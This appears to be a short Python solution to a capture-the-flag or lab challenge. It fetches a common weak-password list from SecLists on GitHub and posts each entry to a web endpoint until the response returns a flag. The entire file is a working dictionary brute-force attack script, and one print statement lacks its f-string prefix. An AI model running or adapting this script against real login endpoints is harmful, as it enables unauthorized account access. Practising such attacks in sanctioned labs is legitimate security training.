#!/usr/bin/python3

import requests


passwords = requests.get(url="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt").text.splitlines()

for password in passwords:
	print(f"attempted password {password}")
	ress = requests.post(url="http://83.136.254.158:58158/dictionary", data={"password":password})
	if ress.ok and "flag" in ress.json():
		print("the password is {password} and the flag is {ress.json()['flag']}")
		print(ress.json())
